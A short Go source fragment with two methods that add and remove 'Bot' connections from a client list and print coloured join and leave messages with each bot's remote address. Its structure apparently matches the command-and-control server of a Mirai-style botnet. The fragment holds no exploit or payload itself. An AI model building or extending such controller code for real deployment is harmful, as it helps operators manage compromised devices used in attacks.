...
func (this *ClientList) AddClient(c *Bot) {
    this.addQueue <- c
	fmt.Printf("\x1b[1;32m[ JOINED ] \x1b[38;5;99mConnect :\x1b[1;33m%s \x1b[38;5;99mType:\x1b[1;33m%s\n", c.conn.RemoteAddr(), c.source)
}

func (this *ClientList) DelClient(c *Bot) {
    this.delQueue <- c
	fmt.Printf("\x1b[1;32m[ LEAVE ] \x1b[38;5;99mDisconnected :\x1b[1;33m%s \x1b[38;5;99mType:\x1b[1;33m%s\n", c.conn.RemoteAddr(), c.source)
}
